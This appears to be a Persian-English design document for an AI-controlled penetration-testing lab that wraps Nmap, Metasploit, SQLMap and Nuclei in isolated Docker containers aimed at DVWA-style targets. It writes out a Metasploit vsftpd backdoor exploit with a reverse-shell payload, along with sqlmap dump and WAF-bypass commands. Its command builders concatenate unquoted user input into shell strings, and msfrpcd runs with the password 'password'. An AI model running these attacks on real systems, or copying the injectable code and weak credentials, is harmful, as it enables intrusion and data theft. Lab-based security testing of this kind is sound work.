# 🔬 Phase 7: تحقیق جامع Tools Integration

**تاریخ:** 2025-12-28  
**وضعیت:** Research Phase - آماده برای پیاده‌سازی

---

## 📋 **بخش 1: ابزارهای هدف SecureRedLab**

### **ابزارهای اصلی (AI-Controlled):**

| # | ابزار | نوع | اولویت | استفاده |
|---|-------|-----|---------|---------|
| **1** | **Nmap** | Port Scanner | 🔴 بالا | Port scanning, OS detection, Service fingerprinting |
| **2** | **Metasploit** | Exploitation Framework | 🔴 بالا | Exploit execution, Payload delivery, Post-exploitation |
| **3** | **SQLMap** | SQL Injection | 🟡 متوسط | Database extraction, Blind SQLi, WAF bypass |
| **4** | **Nuclei** | Vulnerability Scanner | 🟡 متوسط | Template-based scanning, CVE detection |
| **5** | **Nikto** | Web Scanner | 🟢 پایین | Web server scanning, Misconfigurations |
| **6** | **Gobuster** | Directory Brute Force | 🟢 پایین | Directory/file discovery, Subdomain enum |
| **7** | **Hydra** | Password Cracker | 🟢 پایین | Brute force attacks, Credential stuffing |
| **8** | **Custom AI Payloads** | AI-Generated | 🔴 بالا | AI-crafted exploits, Adaptive attacks |

---

## 🎯 **بخش 2: معماری پیشنهادی**

### **معماری کلی:**

```
┌────────────────────────────────────────────────────┐
│             FastAPI Backend (Orchestrator)         │
│                                                    │
│  ┌──────────────────────────────────────────┐    │
│  │  BaseExecutor (Abstract Class)           │    │
│  │  - execute()                              │    │
│  │  - parse_output()                         │    │
│  │  - _run_container()                       │    │
│  │  - _kill_container()                      │    │
│  │  - health_check()                         │    │
│  └──────────────┬───────────────────────────┘    │
│                 │                                  │
│  ┌──────────────┴───────────────────────────┐    │
│  │  Tool-Specific Executors                 │    │
│  ├──────────────────────────────────────────┤    │
│  │  - NmapExecutor                          │    │
│  │  - MetasploitExecutor                    │    │
│  │  - SQLMapExecutor                        │    │
│  │  - NucleiExecutor                        │    │
│  │  - CustomAIExecutor                      │    │
│  └──────────────────────────────────────────┘    │
└────────────────┬───────────────────────────────────┘
                 │
                 │ Docker SDK (Python)
                 │ asyncio + timeout control
                 ▼
┌────────────────────────────────────────────────────┐
│         Docker Daemon (Host)                       │
│                                                    │
│  ┌────────────┐  ┌────────────┐  ┌────────────┐ │
│  │  Nmap      │  │ Metasploit │  │  SQLMap    │ │
│  │  Container │  │  Container │  │  Container │ │
│  └────────────┘  └────────────┘  └────────────┘ │
│                                                    │
│  Network: isolated_pentest (bridge)               │
│  Resource Limits: CPU=1, Memory=512MB             │
│  Timeout: 300s (configurable)                     │
│  Kill Switch: asyncio.wait_for() + SIGKILL        │
└────────────────┬───────────────────────────────────┘
                 │
                 │ Isolated Network
                 ▼
┌────────────────────────────────────────────────────┐
│         Target Environments                        │
│  - DVWA (Damn Vulnerable Web App)                 │
│  - bWAPP (buggy Web Application)                  │
│  - Custom Targets                                  │
└────────────────────────────────────────────────────┘
```

---

## 🔍 **بخش 3: تحقیق عمیق هر ابزار**

---

### **1. Nmap (Priority: HIGH)**

#### **A. Docker Image:**
```dockerfile
# Official Nmap image
FROM instrumentisto/nmap:latest

# Or custom build:
FROM alpine:latest
RUN apk add --no-cache nmap nmap-scripts
```

#### **B. Python Integration:**
- **Library:** `python-nmap` (wrapper around Nmap CLI)
- **Alternative:** Direct CLI execution + XML parsing

#### **C. CLI Usage:**
```bash
# Basic scan
nmap -p 1-1000 192.168.1.1 -oX output.xml

# Service version detection
nmap -sV -p 80,443 example.com -oX output.xml

# OS detection
nmap -O 192.168.1.1 -oX output.xml

# Script scanning
nmap --script vuln -p 80,443 example.com -oX output.xml
```

#### **D. XML Output Parsing:**
```python
import xml.etree.ElementTree as ET

def parse_nmap_xml(xml_file: str) -> dict:
    tree = ET.parse(xml_file)
    root = tree.getroot()
    
    results = {
        'hosts': [],
        'scan_info': {}
    }
    
    # Parse hosts
    for host in root.findall('host'):
        host_data = {
            'ip': host.find('address').get('addr'),
            'state': host.find('status').get('state'),
            'ports': []
        }
        
        # Parse ports
        for port in host.findall('.//port'):
            port_data = {
                'port': port.get('portid'),
                'protocol': port.get('protocol'),
                'state': port.find('state').get('state'),
                'service': port.find('service').get('name', 'unknown')
            }
            host_data['ports'].append(port_data)
        
        results['hosts'].append(host_data)
    
    return results
```

#### **E. NmapExecutor Design:**
```python
class NmapExecutor(BaseExecutor):
    """
    Nmap port scanner executor
    """
    
    async def execute(
        self,
        target: str,
        ports: str = "1-1000",
        scan_type: str = "syn",  # syn, tcp, udp, version
        scripts: list[str] = None,
        timeout: int = 300
    ) -> dict:
        # Build Nmap command
        command = self._build_command(target, ports, scan_type, scripts)
        
        # Run in Docker container
        result = await self._run_container(
            image="instrumentisto/nmap:latest",
            command=command,
            timeout=timeout,
            network="isolated_pentest"
        )
        
        # Parse XML output
        parsed = self.parse_output(result['stdout'])
        
        return parsed
    
    def _build_command(self, target, ports, scan_type, scripts):
        cmd = f"nmap -p {ports}"
        
        if scan_type == "syn":
            cmd += " -sS"
        elif scan_type == "version":
            cmd += " -sV"
        elif scan_type == "udp":
            cmd += " -sU"
        
        if scripts:
            cmd += f" --script {','.join(scripts)}"
        
        cmd += f" {target} -oX /tmp/nmap_output.xml"
        return cmd
    
    def parse_output(self, xml_output: str) -> dict:
        # Use xml.etree.ElementTree to parse
        # Extract hosts, ports, services, versions
        pass
```

---

### **2. Metasploit Framework (Priority: HIGH)**

#### **A. Docker Image:**
```dockerfile
# Official Metasploit image
FROM metasploitframework/metasploit-framework:latest

# Expose msfrpcd port
EXPOSE 55553
```

#### **B. Python Integration:**
- **Library:** `pymetasploit3` (msfrpc client)
- **Alternative:** `msgpack-rpc` for custom client

#### **C. MSFRPC API:**
```python
from pymetasploit3.msfrpc import MsfRpcClient

# Connect to msfrpcd
client = MsfRpcClient('password', server='localhost', port=55553)

# List exploits
exploits = client.modules.exploits

# Use an exploit
exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
exploit['RHOSTS'] = '192.168.1.100'

# Execute
exploit.execute(payload='cmd/unix/reverse')
```

#### **D. MetasploitExecutor Design:**
```python
class MetasploitExecutor(BaseExecutor):
    """
    Metasploit exploitation framework executor
    """
    
    async def execute(
        self,
        target: str,
        exploit_module: str,
        payload: str = "cmd/unix/reverse",
        options: dict = None,
        timeout: int = 600
    ) -> dict:
        # Start msfrpcd in Docker
        container = await self._start_msfrpcd()
        
        try:
            # Connect to msfrpcd
            client = await self._connect_msfrpc(container)
            
            # Execute exploit
            result = await self._execute_exploit(
                client,
                exploit_module,
                target,
                payload,
                options
            )
            
            return result
        
        finally:
            # Cleanup
            await self._stop_container(container)
    
    async def _start_msfrpcd(self):
        """Start Metasploit RPC daemon in Docker"""
        result = await self._run_container(
            image="metasploitframework/metasploit-framework:latest",
            command="msfrpcd -P password -S -a 0.0.0.0",
            timeout=600,
            network="isolated_pentest",
            detach=True  # Run in background
        )
        return result['container_id']
    
    async def _execute_exploit(self, client, module, target, payload, options):
        """Execute exploit via msfrpc"""
        exploit = client.modules.use('exploit', module)
        exploit['RHOSTS'] = target
        
        # Set custom options
        if options:
            for key, value in options.items():
                exploit[key] = value
        
        # Execute
        result = exploit.execute(payload=payload)
        
        return self.parse_output(result)
```

---

### **3. SQLMap (Priority: MEDIUM)**

#### **A. Docker Image:**
```bash
# Official SQLMap image
docker pull paoloo/sqlmap
```

#### **B. Python Integration:**
- **Direct CLI execution** (no official Python library)
- **SQLMap API Server** (REST API)

#### **C. CLI Usage:**
```bash
# Basic SQL injection test
sqlmap -u "http://example.com/page?id=1" --batch

# Database enumeration
sqlmap -u "http://example.com/page?id=1" --dbs --batch

# Table dump
sqlmap -u "http://example.com/page?id=1" -D database -T table --dump --batch

# Tamper scripts (WAF bypass)
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment --batch
```

#### **D. SQLMapExecutor Design:**
```python
class SQLMapExecutor(BaseExecutor):
    """
    SQLMap SQL injection tool executor
    """
    
    async def execute(
        self,
        url: str,
        method: str = "GET",
        data: str = None,
        cookies: str = None,
        tamper: list[str] = None,
        level: int = 1,
        risk: int = 1,
        timeout: int = 600
    ) -> dict:
        # Build SQLMap command
        command = self._build_command(url, method, data, cookies, tamper, level, risk)
        
        # Run in Docker container
        result = await self._run_container(
            image="paoloo/sqlmap",
            command=command,
            timeout=timeout,
            network="isolated_pentest"
        )
        
        # Parse output
        parsed = self.parse_output(result['stdout'])
        
        return parsed
    
    def _build_command(self, url, method, data, cookies, tamper, level, risk):
        cmd = f"sqlmap -u \"{url}\" --batch"
        
        if method == "POST" and data:
            cmd += f" --data=\"{data}\""
        
        if cookies:
            cmd += f" --cookie=\"{cookies}\""
        
        if tamper:
            cmd += f" --tamper={','.join(tamper)}"
        
        cmd += f" --level={level} --risk={risk}"
        cmd += " --output-dir=/tmp/sqlmap_output"
        
        return cmd
```

---

### **4. Nuclei (Priority: MEDIUM)**

#### **A. Docker Image:**
```dockerfile
FROM projectdiscovery/nuclei:latest
```

#### **B. CLI Usage:**
```bash
# Basic scan
nuclei -u https://example.com

# Scan with specific templates
nuclei -u https://example.com -t cves/

# Scan multiple targets
nuclei -l targets.txt -t vulnerabilities/

# Custom templates
nuclei -u https://example.com -t custom-template.yaml
```

#### **C. NucleiExecutor Design:**
```python
class NucleiExecutor(BaseExecutor):
    """
    Nuclei vulnerability scanner executor
    """
    
    async def execute(
        self,
        targets: list[str],
        templates: list[str] = None,
        severity: list[str] = None,  # critical, high, medium, low
        timeout: int = 300
    ) -> dict:
        # Build Nuclei command
        command = self._build_command(targets, templates, severity)
        
        # Run in Docker container
        result = await self._run_container(
            image="projectdiscovery/nuclei:latest",
            command=command,
            timeout=timeout,
            network="isolated_pentest",
            volumes={
                '/templates': {'bind': '/root/nuclei-templates', 'mode': 'ro'}
            }
        )
        
        # Parse JSON output
        parsed = self.parse_output(result['stdout'])
        
        return parsed
    
    def _build_command(self, targets, templates, severity):
        cmd = f"nuclei -u {','.join(targets)}"
        
        if templates:
            cmd += f" -t {','.join(templates)}"
        
        if severity:
            cmd += f" -severity {','.join(severity)}"
        
        cmd += " -json -o /tmp/nuclei_output.json"
        
        return cmd
```

---

## 🏗️ **بخش 4: معماری یکپارچه (Unified Architecture)**

### **A. BaseExecutor (Enhanced):**

```python
from abc import ABC, abstractmethod
import docker
import asyncio
import logging
from typing import Dict, Any, Optional
from datetime import datetime

logger = logging.getLogger(__name__)


class BaseExecutor(ABC):
    """
    Enhanced base executor with complete lifecycle management
    """
    
    def __init__(self):
        self.docker_client = docker.from_env()
        self.logger = logger
        self.active_containers = set()
    
    @abstractmethod
    async def execute(self, **kwargs) -> Dict[str, Any]:
        """Execute the tool"""
        pass
    
    @abstractmethod
    def parse_output(self, raw_output: str) -> Dict[str, Any]:
        """Parse tool output"""
        pass
    
    async def _run_container(
        self,
        image: str,
        command: str,
        timeout: int = 300,
        network: str = "isolated_pentest",
        volumes: Optional[Dict] = None,
        environment: Optional[Dict] = None,
        detach: bool = False
    ) -> Dict[str, Any]:
        """
        Run command in Docker container with full lifecycle management
        """
        container = None
        
        try:
            # Resource limits
            mem_limit = "512m"
            cpu_quota = 100000  # 1 CPU core
            
            # Create container
            container = self.docker_client.containers.create(
                image=image,
                command=command,
                network=network,
                volumes=volumes or {},
                environment=environment or {},
                mem_limit=mem_limit,
                cpu_quota=cpu_quota,
                detach=True,
                remove=False  # Manual cleanup
            )
            
            self.active_containers.add(container.id)
            self.logger.info(f"Starting container {container.short_id}")
            
            # Start container
            container.start()
            
            if detach:
                # Return container for external management
                return {
                    'container_id': container.id,
                    'status': 'running'
                }
            
            # Wait for completion with timeout
            try:
                await asyncio.wait_for(
                    self._wait_for_container(container),
                    timeout=timeout
                )
            except asyncio.TimeoutError:
                self.logger.warning(f"Container {container.short_id} timeout")
                container.kill()
                raise TimeoutError(f"Container execution timeout after {timeout}s")
            
            # Get logs
            stdout = container.logs(stdout=True, stderr=False).decode('utf-8')
            stderr = container.logs(stdout=False, stderr=True).decode('utf-8')
            
            # Get exit code
            exit_code = container.wait()['StatusCode']
            
            return {
                'stdout': stdout,
                'stderr': stderr,
                'exit_code': exit_code,
                'container_id': container.id
            }
        
        except Exception as e:
            self.logger.error(f"Container execution failed: {e}")
            if container:
                self._force_kill(container)
            raise
        
        finally:
            # Cleanup
            if container and not detach:
                self._cleanup_container(container)
    
    async def _wait_for_container(self, container):
        """Wait for container to finish"""
        while True:
            container.reload()
            if container.status != 'running':
                break
            await asyncio.sleep(0.5)
    
    def _force_kill(self, container):
        """Force kill container"""
        try:
            container.kill()
            self.logger.info(f"Killed container {container.short_id}")
        except Exception as e:
            self.logger.error(f"Failed to kill container: {e}")
    
    def _cleanup_container(self, container):
        """Remove container"""
        try:
            container.remove(force=True)
            self.active_containers.discard(container.id)
            self.logger.info(f"Removed container {container.short_id}")
        except Exception as e:
            self.logger.error(f"Failed to remove container: {e}")
    
    def cleanup_all(self):
        """Cleanup all active containers"""
        for container_id in list(self.active_containers):
            try:
                container = self.docker_client.containers.get(container_id)
                self._cleanup_container(container)
            except:
                pass
```

---

## 🔐 **بخش 5: امنیت و Isolation**

### **A. Network Isolation:**
```yaml
# docker-compose.yml
networks:
  isolated_pentest:
    driver: bridge
    ipam:
      config:
        - subnet: 172.25.0.0/16
    internal: true  # No external access
```

### **B. Resource Limits:**
```python
# Per-container limits
mem_limit = "512m"        # 512MB RAM
cpu_quota = 100000        # 1 CPU core
pids_limit = 100          # Max 100 processes
```

### **C. Timeout & Kill Switch:**
```python
# asyncio.wait_for with timeout
try:
    await asyncio.wait_for(
        self._wait_for_container(container),
        timeout=300  # 5 minutes
    )
except asyncio.TimeoutError:
    container.kill()  # SIGKILL
```

### **D. Security Best Practices:**
1. **Read-only file system** (where possible)
2. **Drop all capabilities**
3. **Non-root user** in containers
4. **Seccomp profiles**
5. **AppArmor/SELinux**

---

## 📊 **بخش 6: خلاصه تصمیمات**

| جنبه | تصمیم | دلیل |
|-----|-------|------|
| **Docker SDK** | Python Docker SDK (docker-py) | Native Python, async support |
| **Network** | Bridge network (isolated_pentest) | Complete isolation |
| **Timeout** | asyncio.wait_for() | Async-friendly, SIGKILL on timeout |
| **Resources** | 512MB RAM, 1 CPU | Prevent resource exhaustion |
| **Parsing** | XML (Nmap), JSON (Nuclei), Text (others) | Standard formats |
| **Error Handling** | Try/except + cleanup | Graceful degradation |
| **Logging** | Python logging + Redis Pub/Sub | Real-time updates |

---

## 🚀 **بخش 7: Implementation Order**

### **Phase 7 Sub-Phases:**

1. **Phase 7.1: BaseExecutor Enhancement** (4 ساعت)
   - Complete lifecycle management
   - Timeout & kill switch
   - Resource limits
   - Cleanup logic

2. **Phase 7.2: NmapExecutor** (6 ساعت)
   - Docker integration
   - XML parsing
   - Real-time progress
   - Test with DVWA

3. **Phase 7.3: MetasploitExecutor** (8 ساعت)
   - msfrpcd integration
   - pymetasploit3 client
   - Exploit execution
   - Test with DVWA

4. **Phase 7.4: SQLMapExecutor** (6 ساعت)
   - CLI automation
   - Tamper scripts
   - Output parsing
   - Test with DVWA

5. **Phase 7.5: NucleiExecutor** (4 ساعت)
   - Template management
   - JSON parsing
   - Custom templates
   - Test with DVWA

6. **Phase 7.6: Integration Testing** (4 ساعت)
   - End-to-end tests
   - Performance testing
   - Security validation

**Total Estimated Time:** ~32 ساعت (4 روز)

---

## ✅ **آماده برای Phase 7 Implementation**

**این سند شامل:**
- ✅ تحقیق کامل هر ابزار
- ✅ معماری یکپارچه
- ✅ Docker integration patterns
- ✅ Security best practices
- ✅ Implementation roadmap

**بعدی:**
- شروع Phase 7.1: BaseExecutor Enhancement
- پیاده‌سازی کامل با تست‌های واقعی

---

**تاریخ تکمیل تحقیق:** 2025-12-28  
**آماده برای کدنویسی:** ✅ YES
